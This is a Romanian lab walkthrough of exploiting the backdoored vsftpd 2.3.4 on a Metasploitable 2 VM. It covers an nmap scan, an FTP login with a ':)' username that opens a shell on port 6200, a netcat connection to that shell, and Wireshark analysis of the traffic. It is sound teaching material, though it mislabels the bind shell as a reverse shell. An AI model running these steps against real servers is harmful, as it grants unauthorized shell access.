
### Atac FTP:

   - [Despre FTP](https://github.com/Dani780-C/Cyber-security/blob/main/learn/_ftp.md)
   - versiune: vsftpd 2.3.4
   ```
   In 2011, in arhiva de pe site-ul oficial al serviciului FTP a fost atasat un virus backdoor care executa un shell pe portul 6200. Pentru a executa virusul, username-ul folosit la conectarea serviciului FTP putea fi oricare sir de caractere urmat de un ":)". 
   ```
   - Pasii atacului:
      
         nmap -sSV 192.168.56.102 -p21,6200  
          
     ##### Explicatii comanda:
      - nmap command  
      - 192.168.56.102 <-> adresa IP a tintei (Metaplsoitable 2)  
      - -p21,6200 <-> scanam doar porturile 21 si 6200 (21 este portul pentru serviciul FTP, iar 6200 este cel pe care se va efectua un reverse shell)  

      ![My Image](https://github.com/Dani780-C/Cybersecurity/blob/main/attacks/imgs/ftp-nmap-1.png)

     Se poate observa ca portul 6200 inca nu este deschis.  
     Folosim comanda ftp pentru a ne conecta la serviciul FTP.  
     Dupa ce vom executa aceasta comanda, va trebui sa introducem datele de login (user si parola).  
     Pentru user vom folosi orice string urmat de ":)", iar parola poate fi nula sau orice string.  
     Despre vulnerabilitate: [vsftpd backdoored](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)
     
         ftp 192.168.56.102 21
     
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-2.png)
     
         nmap 192.168.56.102 -p6200
         
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-nmap-2.png)
     
     Se poate vedea dupa o inca scanare a portului 6200 ca acum este deschis, deci ne vom folosi de `netcat` pentru a ne conecta.
     
         nc -v 192.168.56.102 6200
             
      ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-done.png)
     
   - Analiza trafic:
      - [Captura traficului pentru serviciului FTP in timpul atacului](https://github.com/Dani780-C/Cyber-security/blob/main/captures/ftp-traffic.pcapng)
      - Pentru a filtra traficul din captura wireshark se poate folosi filtrul *tcp.stream eq 0* pentru a vedea doar pachetele dintre atacator si tinta din prima conexiune esuata
      ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-first-connection.png)
      - Pentru a filtra traficul din captura wireshark se poate folosi filtrul *tcp.stream eq 1* pentru a doua conexiune pe portul 6200 prin care s-a efectuat un reverse shell
      ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-second-conn-port-6200.png)
